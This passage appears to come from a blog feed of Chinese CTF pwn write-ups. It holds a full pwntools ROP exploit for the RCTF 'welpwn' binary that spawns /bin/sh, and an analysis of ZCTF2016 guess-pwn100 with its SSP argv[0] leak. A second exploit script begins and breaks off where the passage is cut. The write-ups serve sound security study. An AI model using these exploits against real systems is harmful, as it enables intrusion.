class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 方法：未知libc.so版本,使用DynELF()泄露libc.so中的函数地址</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = addr,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = addr</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,addr,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recv(<span class="number">8</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span> + <span class="number">0x1b</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x -&gt; %s"</span> %(addr, (result <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    d = DynELF(leak,elf = ELF(<span class="string">'./welpwn'</span>))</span><br><span class="line">    system_addr = int(d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    gets_addr = int(d.lookup(<span class="string">'gets'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"gets_addr:"</span>,hex(gets_addr)</span><br><span class="line"></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(bss_addr) + p64(gets_addr) </span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">    rop += p64(main_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload += rop</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ZCTF2016——WriteUp(Pwn)</title>
      <link href="/2020/07/05/ZCTF2016%E2%80%94%E2%80%94WriteUp(Pwn)/"/>
      <url>/2020/07/05/ZCTF2016%E2%80%94%E2%80%94WriteUp(Pwn)/</url>
      <content type="html"><![CDATA[<blockquote><p>ZCTF2016 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="guess-pwn100"><a href="#guess-pwn100" class="headerlink" title="guess-pwn100"></a>guess-pwn100</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec guess</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/guess&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有<code>栈溢出</code>，开启了<code>NX(DEP)</code>使<code>堆栈</code>上的代码不可执行。</p><h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;首先，这是一个<code>64位</code>的<code>ELF</code>可执行程序。我们使用<code>IDA</code>反汇编此文件，并用反编译插件得到<code>主函数的伪代码</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> mark; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> current_position; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> input_flag[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )                                <span class="comment">// 打开失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);                  <span class="comment">// 关闭缓冲</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">60u</span>);</span><br><span class="line">  <span class="comment">// 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">2</span>);                        <span class="comment">// SEEK_END = 2</span></span><br><span class="line">  current_position = ftell(stream);             <span class="comment">// 返回给定流 stream 的当前文件位置。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  fgets(&amp;str, current_position + <span class="number">1</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please guess the flag:"</span>);</span><br><span class="line">  gets(input_flag);                             <span class="comment">// 输入flag,存在溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( current_position != (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(input_flag) )<span class="comment">// 验证flag长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(input_flag, <span class="string">"ZCTF&#123;"</span>, <span class="number">5u</span>LL) )      <span class="comment">// 验证flag开头</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag is start with ZCTF&#123;"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; current_position; ++i )      <span class="comment">// 输入的flag和真正的flag进行异或</span></span><br><span class="line">    *(&amp;str + i) ^= input_flag[i];</span><br><span class="line">  mark = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; current_position; ++j )      <span class="comment">// 如果输入的flag正确,则异或结果全部为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;str + j) )</span><br><span class="line">    &#123;</span><br><span class="line">      mark = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mark )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看出<code>整个程序的逻辑</code>是这样的。首先，<code>读取</code>当前文件夹下的<code>flag文件</code>，从这个文件中读出<code>真正的flag</code>、以及<code>flag的长度</code>。然后提示用户输入flag，程序先验证<code>用户输入的flag的长度</code>是否正确，再将<code>用户输入的flag</code>与<code>flag文件中读出的flag</code>进行<code>异或</code>，根据<code>异或的结果</code>判断<code>输入的flag</code>是否是<code>正确的flag</code>。如果<code>异或的结果</code>每一个字节都为<code>&quot;\x00&quot;</code>，则<code>输入的flag正确</code>。反之，则不正确。</p><h3 id="0x20-编写exp"><a href="#0x20-编写exp" class="headerlink" title="0x20 编写exp"></a>0x20 编写exp</h3><h4 id="0x21-Stack-Smashing-Protector"><a href="#0x21-Stack-Smashing-Protector" class="headerlink" title="0x21 Stack Smashing Protector"></a>0x21 Stack Smashing Protector</h4><p>&emsp;&emsp;<code>Stack Smashing Protector</code>是一种众所周知的针对<code>基于栈的内存损坏的缓解措施</code>(例如：连续的缓冲区溢出)。也就是常说的<code>Canary</code>。</p><p>&emsp;&emsp;我们可以在编译程序的时候使用<code>“–fstack-protector”</code>或<code>“–fstack-protector-all”</code>开启它，使用<code>“–fno-stack-protector”</code>关闭它。</p><h4 id="0x22-开启了Stack-Smashing-Protector的程序特征"><a href="#0x22-开启了Stack-Smashing-Protector的程序特征" class="headerlink" title="0x22 开启了Stack Smashing Protector的程序特征"></a>0x22 开启了Stack Smashing Protector的程序特征</h4><p>&emsp;&emsp;开启了<code>Stack Smashing Protector</code>的程序会在<code>函数序言</code>和<code>函数尾声</code>添加一些汇编代码，如下所示：</p><p><strong><code>函数序言：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000000000040096D</span>     <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040096E     <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400971</span>     <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400972</span>     <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400976</span>     <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span>       -|</span><br><span class="line"><span class="symbol">.text:</span>000000000040097F     <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+canary], <span class="built_in">rax</span>  |向栈中写入Canary</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400983</span>     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>          -|</span><br></pre></td></tr></table></figure></p><p><strong><code>函数尾声：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000400B6F loc_400B6F:                             </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B6F     <span class="keyword">mov</span>     <span class="built_in">rbx</span>, [<span class="built_in">rbp</span>+canary]  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B73     <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">fs</span>:<span class="number">28h</span>         |验证栈中的Canary</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7C     <span class="keyword">jz</span>      short loc_400B83    |是否被修改</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7E     <span class="keyword">call</span>    ___stack_chk_fail  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83 loc_400B83:                    </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83     <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B87     <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B88     <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B89     <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>fs:28h</code>中的值是<code>随机的</code>，每次程序启动都会不同，但在<code>某次程序运行过程中</code>，它是不会改变的。<code>Canary</code>在栈中的位置，一般是在<code>函数栈帧</code>的<code>ebp/rbp的上方</code>(低地址处)。当函数执行完功能后，会验证<code>栈上的Canary</code>是否被修改。如果<code>被修改</code>，会调用<code>__stack_chk_fail()</code>函数，__stack_chk_fail()函数内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到<code>__stack_chk_fail()</code>函数又调用了<code>__fortify_fail()</code>函数，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>msg</code>的内容为<code>“stack smashing detected”</code>，<code>__libc_argv[0]</code>的内容为<code>当前运行程序</code>的<code>名称字符串</code>。所以，如果<code>栈溢出</code>覆盖了<code>Canary</code>，则会输出以下字符串：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">**************************************</span><br><span class="line">test.c</span><br><span class="line">gcc test.c –fstack-protector -o test</span><br><span class="line">**************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">$ ./test </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./test terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">47585</span> <span class="built_in">abort</span> (core dumped)  ./test</span><br></pre></td></tr></table></figure></p><h4 id="0x23-利用Stack-Smashing-Protector泄露信息"><a href="#0x23-利用Stack-Smashing-Protector泄露信息" class="headerlink" title="0x23 利用Stack Smashing Protector泄露信息"></a>0x23 利用Stack Smashing Protector泄露信息</h4><p>&emsp;&emsp;如果将<code>__libc_argv[0]</code>中的<code>字符串指针</code>覆盖为<code>要泄露的信息的地址</code>，就可以泄露出想<code>要泄露出的信息</code>。</p><p><strong><code>利用思路：</code></strong></p><blockquote><p>1、构造<code>满足条件</code>(flag开头为ZCTF{)的<code>不同长度</code>的flag字符串，通过<code>返回信息</code>，来判断是否为<code>正确的flag的长度</code>。</p><p>2、泄露出<code>正确flag的长度</code>后，构造<code>满足条件</code>(flag开头为ZCTF{)及<code>正确长度</code>的flag，并用<code>“\x00”</code>作为flag字符串的结束，绕过<code>flag长度的验证</code>。然后，继续覆盖至<code>main函数</code>的参数<code>argv[0]</code>，将其覆盖为<code>&amp;str+0x5</code>(&amp;str为存储真实flag的地址)。因为前5个字节<code>“ZCTF{”</code>相同，所以，<code>异或后的结果</code>为<code>“\x00”</code>，只能从第6字节开始泄露。</p><p>3、<code>异或</code>在异或双方不同情况下是<code>可逆的</code>，所以我们需要选取一个<code>不在</code>正确flag中的字母，与<code>正确flag</code>的每一个字符进行<code>异或</code>。泄露出<code>异或后的结果字符串</code>后，再用<code>相同的字母</code>进行一次<code>异或</code>，就可以得到<code>正确的flag</code>。如果选取<code>正确flag中的字符</code>，异或后结果为<code>“\x00”</code>，泄漏时会造成<code>“\x00”截断</code>。我们需要不断尝试，找到一个<code>合适的异或数</code>。这里选用<code>“b”</code>。</p></blockquote><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 测试Flag: ZCTF&#123;welcome_to_zctf,i_love_you&#125;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./guess'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x40096D,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400A2F,ftell()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A61,fgets()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A83,gets()函数调用地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> 